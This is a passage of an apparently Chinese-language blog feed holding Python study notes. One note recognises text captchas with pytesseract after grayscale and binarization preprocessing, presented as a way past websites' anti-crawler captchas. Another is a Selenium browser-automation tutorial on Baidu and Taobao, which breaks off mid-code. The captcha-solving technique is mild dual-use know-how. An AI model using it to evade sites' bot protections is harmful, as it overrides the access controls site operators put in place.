alt="avatar"></p><p>重新用以下代码来测试：<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line">from PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="built_in">image</span>=Image.<span class="built_in">open</span>(<span class="string">'D:\\code2.png'</span>)</span><br><span class="line"><span class="built_in">image</span>=<span class="built_in">image</span>.convert(<span class="string">'RGB'</span>)</span><br><span class="line"><span class="built_in">print</span>(pytesseract.image_to_string(<span class="built_in">image</span>))</span><br></pre></td></tr></table></figure><br>我刷新的这个验证码并没有出现偏差，但是例如<br><img src="/img/python3/test.jpg" alt="avatar"><br>就会出现偏差<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line">from PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="built_in">image</span>=Image.<span class="built_in">open</span>(<span class="string">'D:\\test.jpg'</span>)</span><br><span class="line"><span class="built_in">image</span>=<span class="built_in">image</span>.convert(<span class="string">'RGB'</span>)</span><br><span class="line"><span class="built_in">print</span>(pytesseract.image_to_string(<span class="built_in">image</span>))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">thye</span><br></pre></td></tr></table></figure><br>这个时候，其实是因为验证码多余的线条干扰了图片的识别，我们在这里还需要进行额外的处理，如转灰度，二值化等操作</p><p>我们可以利用Image对象的convert()方法传入L，即可将图片转为灰度图像<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">image</span>=<span class="built_in">image</span>.<span class="built_in">convert</span>('L')</span><br><span class="line"><span class="built_in">image</span>.<span class="built_in">show</span>()</span><br></pre></td></tr></table></figure><br><img src="/img/python3/验证码2.png" alt="avatar"></p><p>这样就成功将其灰度化</p><p>传入1即可将图片进行二值化处理<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">image</span>=<span class="built_in">image</span>.<span class="built_in">convert</span>('<span class="number">1</span>')</span><br><span class="line"><span class="built_in">image</span>.<span class="built_in">show</span>()</span><br></pre></td></tr></table></figure><br>我们还可以指定二值化的阈值，上面的方法默认采用的是127.不过我们不能直接转换，需要将图片先灰度化，然后化再指定阈值<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">image</span>=<span class="built_in">image</span>.<span class="built_in">convert</span>('L')</span><br><span class="line">threshold=<span class="number">110</span></span><br><span class="line">table=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">if</span> i&lt;threshold:</span><br><span class="line">        table.<span class="built_in">append</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        table.<span class="built_in">append</span>(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">image</span>=<span class="built_in">image</span>.point(table,'<span class="number">1</span>')</span><br><span class="line"><span class="built_in">image</span>.<span class="built_in">show</span>()</span><br></pre></td></tr></table></figure><br><img src="/img/python3/验证码3.png" alt="avatar"><br>这里将阈值调整为110 图片中的内容才能显示完成，阈值的值是根据验证码的情况来确定的，并不是一个定值</p><p>我们看到经过处理之后的验证码，线条已经被去除，验证码变得黑白分明，这个时候才重新识别验证码<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line">from PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="built_in">image</span>=Image.<span class="built_in">open</span>(<span class="string">'D:\\test.png'</span>)</span><br><span class="line"><span class="built_in">image</span>=<span class="built_in">image</span>.convert(<span class="string">'RGB'</span>)</span><br><span class="line"><span class="built_in">image</span>=<span class="built_in">image</span>.convert(<span class="string">'L'</span>)</span><br><span class="line">threshold=<span class="number">110</span></span><br><span class="line">table=[]</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">if</span> i&lt;threshold:</span><br><span class="line">        table.<span class="built_in">append</span>(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        table.<span class="built_in">append</span>(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">image</span>=<span class="built_in">image</span>.<span class="built_in">point</span>(table,<span class="string">'1'</span>)</span><br><span class="line"><span class="built_in">print</span>(pytesseract.image_to_string(<span class="built_in">image</span>))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">fhYe</span><br></pre></td></tr></table></figure><br>针对一些有干扰的图片，我们就可以做一些灰度和二值化的处理，以此来提高图片的正确率</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.tesseror库比较过时，而且版本更新较慢，目前只支持到了python3.7的版本</p><p>2.由于tesseror库无法使用，所以采用了pytesseract库，但是由于pytesseract库的特性，只会识别RGB通道的图片，所以需要在每条语句的后面都添加上image.convert(‘RGB’)</p><p>3.文字验证码较为简单，但是会有一些斑点或线条等进行干扰，所以需要采用灰度和二值化来进行处理</p><p>4.二值化处理之前需要先进行灰度化的处理，并且每个图片需要设置的阈值可能会不同，阈值不是一个定值，需要经常进行更换</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;验证码的识别&quot;&gt;&lt;a href=&quot;#验证码的识别&quot; class=&quot;headerlink&quot; title=&quot;验证码的识别&quot;&gt;&lt;/a&gt;验证码的识别&lt;/h1&gt;&lt;p&gt;随着爬虫越来越多，许多网站都采取了各种各样的反爬虫机制，其中最常见的就是使用验证码，现在随着技术的发展，验证
      
    
    </summary>
    
    
      <category term="日常学习" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="Python3" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/Python3/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Python3-2020/4/26-周报9</title>
    <link href="http://yoursite.com/2020/04/26/Python3-2020-4-26-%E5%91%A8%E6%8A%A59/"/>
    <id>http://yoursite.com/2020/04/26/Python3-2020-4-26-%E5%91%A8%E6%8A%A59/</id>
    <published>2020-04-26T00:08:55.000Z</published>
    <updated>2020-05-11T13:17:57.533Z</updated>
    
    <content type="html"><![CDATA[<h1 id="动态渲染页面爬取"><a href="#动态渲染页面爬取" class="headerlink" title="动态渲染页面爬取"></a>动态渲染页面爬取</h1><p>前面了解到了Ajax的分析和爬取方式，这其实也是JavaScript动态渲染页面的一种方式，通过直接分析Ajax,仍然可以借助requests或urllib来实现数据爬取</p><p>但是JavaScript的动态渲染页面不止Ajax这一种，例如有些网站的分页是由JavaScript生成的，并非是原始的HTML代码，其中也并不包含Ajax</p><h2 id="Selenium的使用"><a href="#Selenium的使用" class="headerlink" title="Selenium的使用"></a>Selenium的使用</h2><p>Selenium是一个自动化测试工具，利用它可以驱动浏览器执行指定的动作，如点击，下来等操作，同时还可以获取浏览器当前呈现的页面的源代码，做到可见即可爬</p><h3 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by import By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.keys import Keys</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support import expected_conditions as EC</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.wait import WebDriverWait</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line">try:</span><br><span class="line">    browser.<span class="builtin-name">get</span>(<span class="string">"https://www.baidu.com"</span>)</span><br><span class="line">    <span class="attribute">input</span>=browser.find_element_by_id('kw')</span><br><span class="line">    input.send_keys(<span class="string">'Python'</span>)</span><br><span class="line">    input.send_keys(Keys.ENTER)</span><br><span class="line">    <span class="attribute">wait</span>=WebDriverWait(browser,10)</span><br><span class="line">    wait.until(EC.presence_of_element_located((By.ID , <span class="string">'content_left'</span>)))</span><br><span class="line">    <span class="builtin-name">print</span>(browser.current_url)</span><br><span class="line">    <span class="builtin-name">print</span>(browser.get_cookies())</span><br><span class="line">    <span class="builtin-name">print</span>(browser.page_source)</span><br><span class="line">finally:</span><br><span class="line">    browser.close()</span><br><span class="line">    </span><br><span class="line">输出结果：</span><br><span class="line">当前URL，cookies和网页源代码</span><br></pre></td></tr></table></figure><p>再执行上条指令后，会自动弹出一个Chrome浏览器，浏览器首先会跳转到百度，然后在搜索框中输出Python，接着跳转到搜索结果页面<br><img src="/img/python3/selenium0.png" alt="avatar"><br><img src="/img/python3/selenium1.png" alt="avatar"></p><p>这样我们就可以直接拿到JavaScript渲染的结果了</p><h3 id="声明浏览器对象"><a href="#声明浏览器对象" class="headerlink" title="声明浏览器对象"></a>声明浏览器对象</h3><p>Selenium支持非常多的浏览器，如Chrome,Firefox,Edge等，还有Android，BlackBerry等手机端浏览器，还支持无界面浏览器PhantomJS</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line"><span class="attribute">browser</span>=webdriver.Firefox()</span><br><span class="line"><span class="attribute">browser</span>=webdriver.Edge()</span><br><span class="line"><span class="attribute">browser</span>=webdriver.PhantomJS()</span><br><span class="line"><span class="attribute">browser</span>=webdriver.Safari()</span><br></pre></td></tr></table></figure><p>这样就完成了浏览器对象的初始化，并将其赋值为browser对象</p><h3 id="访问页面"><a href="#访问页面" class="headerlink" title="访问页面"></a>访问页面</h3><p>我们可以使用get()方法来请求网页，参数传URL即可<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line">browser.<span class="builtin-name">get</span>(<span class="string">'https://www.taobao.com'</span>)</span><br><span class="line"><span class="builtin-name">print</span>(browser.page_source)</span><br><span class="line">browser.close()</span><br></pre></td></tr></table></figure><br>运行后发现，弹出了Chrome浏览器并且自动访问了淘宝，然后控制台输出了淘宝页面的源代码，随后浏览器关闭</p><h3 id="查找结点"><a href="#查找结点" class="headerlink" title="查找结点"></a>查找结点</h3><p>selenium可以驱动浏览器完成各种操作，比如填充表单，模拟点击等。比如，我们想要完成向某个输入框输入文字的操作，需要知道这个输入框在哪里，而selenium提供了一系列查找节点的方法</p><h4 id="单个节点"><a href="#单个节点" class="headerlink" title="单个节点"></a>单个节点</h4><p>比如，想要从淘宝页面中提取搜索框这个节点，首先观察它的源代码<br><img src="/img/python3/selenium2.png" alt="avatar"><br>可以发现它的id是q,name也是q，此外还有许多其他属性，我们就可以以多种方式获取了<br>比如find_element_by_name()是根据name获取，find_element_by_id()是根据id获取<br>另外，还有根据XPath，CSS选择器等获取方式<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line"></span><br><span class="line">browser=webdriver.Chrome()</span><br><span class="line">browser.get(<span class="string">'https://www.taobao.com'</span>)</span><br><span class="line">input_first=browser.find_element_by_id(<span class="string">'q'</span>)</span><br><span class="line">input_second=browser.find_element_by_css_selector(<span class="string">'#q'</span>)</span><br><span class="line">input_third=browser.find_element_by_xpath(<span class="string">'//*[@id="q"]'</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(input_first,input_second,input_third)</span></span></span><br><span class="line">browser.close()</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">&lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"b332cd2cb2191a08286eada1aceb4b4e"</span>, element=<span class="string">"1b3bf42c-4780-4c65-9b6f-fca9190503f4"</span>)&gt;</span><br><span class="line">&lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"b332cd2cb2191a08286eada1aceb4b4e"</span>, element=<span class="string">"1b3bf42c-4780-4c65-9b6f-fca9190503f4"</span>)&gt;</span><br><span class="line">&lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"b332cd2cb2191a08286eada1aceb4b4e"</span>, element=<span class="string">"1b3bf42c-4780-4c65-9b6f-fca9190503f4"</span>)&gt;</span><br></pre></td></tr></table></figure></p><p>我们发现结果一至，可以看到这三个节点都是WebElement类型<br>获取单个节点的方法：<br><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">find<span class="number">_</span>element<span class="number">_</span><span class="meta">by</span><span class="number">_</span>id</span><br><span class="line">find<span class="number">_</span>element<span class="number">_</span><span class="meta">by</span><span class="number">_n</span>ame</span><br><span class="line">find<span class="number">_</span>element<span class="number">_</span><span class="meta">by</span><span class="number">_</span>xpath</span><br><span class="line">find<span class="number">_</span>element<span class="number">_</span><span class="meta">by</span><span class="number">_</span>link<span class="number">_</span>text</span><br><span class="line">find<span class="number">_</span>element<span class="number">_</span><span class="meta">by</span><span class="number">_p</span>artial<span class="number">_</span>link<span class="number">_</span>text</span><br><span class="line">find<span class="number">_</span>element<span class="number">_</span><span class="meta">by</span><span class="number">_</span>tag<span class="number">_n</span>ame</span><br><span class="line">find<span class="number">_</span>element<span class="number">_</span><span class="meta">by</span><span class="number">_</span><span class="keyword">class</span><span class="number">_n</span>ame</span><br><span class="line">find<span class="number">_</span>element<span class="number">_</span><span class="meta">by</span><span class="number">_</span>css<span class="number">_</span>selector</span><br></pre></td></tr></table></figure><br>此外还提供了通用方法find_element()，它需要传入两个参数，查找方法By和值<br>实际就是上述方法的通用版本</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.<span class="keyword">by</span> <span class="keyword">import</span> <span class="keyword">By</span></span><br><span class="line"></span><br><span class="line">browser=webdriver.Chrome()</span><br><span class="line">browser.<span class="keyword">get</span>(<span class="string">'https://www.taobao.com'</span>)</span><br><span class="line">input_first=browser.find_element(<span class="keyword">By</span>.ID,<span class="string">'q'</span>)</span><br><span class="line">print(input_first)</span><br><span class="line">browser.<span class="keyword">close</span>()</span><br><span class="line"></span><br><span class="line">输出结果与上面一至</span><br></pre></td></tr></table></figure><h4 id="多个节点"><a href="#多个节点" class="headerlink" title="多个节点"></a>多个节点</h4><p>如果查找的目标在网页中只有一个，那么完全可以使用find_element()方法，但是如果有多个节点，就需要使用find_elements()方法了</p><p>比如淘宝导航条的所有条目<br><img src="/img/python3/selenium3.png" alt="avatar"></p><p>先查看这些条目，发现都在class为service-bd的ul节点的li节点中<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line"></span><br><span class="line">browser=webdriver.Chrome()</span><br><span class="line">browser.get(<span class="string">'https://www.taobao.com'</span>)</span><br><span class="line">lis=browser.find_elements_by_css_selector(<span class="string">'.service-bd li'</span>)</span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(lis)</span></span></span><br><span class="line">browser.close()</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">[&lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"7237cd9e-6812-41b2-839c-5a5ef0790077"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"cd8c7478-6486-4376-8c25-a562dad5be68"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"01ac2aac-0431-49f5-9e9b-244fb11a5b99"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"5f10b89b-f4f2-4efb-a084-3ce219e81aa2"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"b99fefe4-b5d0-42c9-84d2-068ba0738d53"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"4ce8e958-225e-480b-9e43-d0510bd6b7ee"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"c37b736b-8d99-4424-a38c-f5270bdc274c"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"a1c19196-5d1e-414b-ae4b-44ad67938651"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"387c966a-29d2-4ced-a1bf-ae11d24f3252"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"f74ecd4d-68eb-4be6-b50a-6ad5f792b9af"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"5c413df1-2c09-4a10-88ee-c27287535d6e"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"73ee7920-b2dd-44dd-b5b5-97a36b5684e1"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"5ef053b7-90a1-4a0d-b504-284d8d9ed497"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"555d8a92-90bd-4724-99ab-fcdb88397077"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"98329539-7cf1-404a-8903-d3ea72f3bb6d"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"df6d8c38-5f1d-4872-8a30-d6e0e1ca02ad"</span>)&gt;]</span><br></pre></td></tr></table></figure><br>这样就获取到了所有条目的源代码</p><p>获取多个节点<br><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">find<span class="number">_</span>elements<span class="number">_</span><span class="meta">by</span><span class="number">_</span>id</span><br><span class="line">find<span class="number">_</span>elements<span class="number">_</span><span class="meta">by</span><span class="number">_n</span>ame</span><br><span class="line">find<span class="number">_</span>elements<span class="number">_</span><span class="meta">by</span><span class="number">_</span>xpath</span><br><span class="line">find<span class="number">_</span>elementst<span class="number">_</span><span class="meta">by</span><span class="number">_</span>link<span class="number">_</span>text</span><br><span class="line">find<span class="number">_</span>elements<span class="number">_</span><span class="meta">by</span><span class="number">_p</span>artial<span class="number">_</span>link<span class="number">_</span>text</span><br><span class="line">find<span class="number">_</span>elements<span class="number">_</span><span class="meta">by</span><span class="number">_</span>tag<span class="number">_n</span>ame</span><br><span class="line">find<span class="number">_</span>elements<span class="number">_</span><span class="meta">by</span><span class="number">_</span><span class="keyword">class</span><span class="number">_n</span>ame</span><br><span class="line">find<span class="number">_</span>elementst<span class="number">_</span><span class="meta">by</span><span class="number">_</span>css<span class="number">_</span>selector</span><br></pre></td></tr></table></figure></p><p>同时还有通用方法<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lis=browser.find<span class="constructor">_elements(By.CSS_SELECTOR,'.<span class="params">service</span>-<span class="params">bd</span> <span class="params">li</span>')</span></span><br></pre></td></tr></table></figure></p><h4 id="节点交互"><a href="#节点交互" class="headerlink" title="节点交互"></a>节点交互</h4><p>我们还可以让浏览器执行一些操作，比较常见的如输入文字时用send_keys()方法，清空文字时用clear()方法，点击按钮时用click()方法<br><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> <span class="type">time</span></span><br><span class="line"></span><br><span class="line">browser=webdriver.Chrome()</span><br><span class="line">browser.<span class="keyword">get</span>(<span class="string">'https://www.taobao.com'</span>)</span><br><span class="line">input=browser.find_element_by_id(<span class="string">'q'</span>)</span><br><span class="line"><span class="keyword">input</span>.send_keys(<span class="string">'iphone'</span>)</span><br><span class="line"><span class="type">time</span>.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">input</span>.clear()</span><br><span class="line"><span class="keyword">input</span>.send_keys(<span class="string">'ipad'</span>)</span><br><span class="line">button=browser.find_element_by_class_name(<span class="string">'btn-search'</span>)</span><br><span class="line">button.click()</span><br></pre></td></tr></table></figure><br>这里首先驱动浏览器打开淘宝，然后用find_element_by_id()方法获取输入框，然后用send_keys()方法输入iphone文字，等待一秒后用clear()方法清空输入框，再次调用send_keys()方法输入ipad文字，之后再用find_element_by_class_name()方法获取搜索按钮，最后调用click()方法完成搜索动作</p><p>更多交互请参考文档：<br>中文文档：<br><a href="https://python-selenium-zh.readthedocs.io/zh_CN/latest/" target="_blank" rel="noopener">https://python-selenium-zh.readthedocs.io/zh_CN/latest/</a><br>官方文档：<br><a href="https://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.remote.webelement" target="_blank" rel="noopener">https://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.remote.webelement</a></p><h4 id="动作链"><a href="#动作链" class="headerlink" title="动作链"></a>动作链</h4><p>在上面的实例中，发现一些交互动作都是针对某个节点执行的。比如，对于输入框，我们就是调用它的输入文字和清空文字方法，对于按钮，就调用它的点击方法.其次，还有另外一些操作，它们没有特定的执行对象，比如鼠标拖拽，键盘按键等</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> ActionChains</span><br><span class="line"></span><br><span class="line">browser=webdriver.Chrome()</span><br><span class="line">url="http://www.runoob.com/try/try.php?filename=jqueryui-api-droppable"</span><br><span class="line">browser.<span class="keyword">get</span>(url)</span><br><span class="line">browser.switch_to.frame(<span class="string">'iframeResult'</span>)</span><br><span class="line">source = browser.find_element_by_css_selector(<span class="string">'#draggable'</span>)</span><br><span class="line">target = browser.find_element_by_css_selector(<span class="string">'#droppable'</span>)</span><br><span class="line">actions = ActionChains(browser)</span><br><span class="line">actions.drag_and_drop(source , target)</span><br><span class="line">actions.<span class="keyword">perform</span>()</span><br></pre></td></tr></table></figure><p>运行后会将小方块拖拽到大方块中<br><img src="/img/python3/selenium4.png" alt="avatar"></p><p>更多动作链操作请参考文档：<br>中文文档：<br><a href="https://python-selenium-zh.readthedocs.io/zh_CN/latest/" target="_blank" rel="noopener">https://python-selenium-zh.readthedocs.io/zh_CN/latest/</a><br>官方文档：<br><a href="https://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.remote.webelement" target="_blank" rel="noopener">https://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.remote.webelement</a></p><h4 id="执行JavaScript"><a href="#执行JavaScript" class="headerlink" title="执行JavaScript"></a>执行JavaScript</h4><p>对于某些操作，Selenium API并没有提供。比如，下拉进度条，它可以直接模拟运行JavaScript，此时使用execute_script()方法即可实现<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line"></span><br><span class="line">browser=webdriver.<span class="constructor">Chrome()</span></span><br><span class="line">browser.get(<span 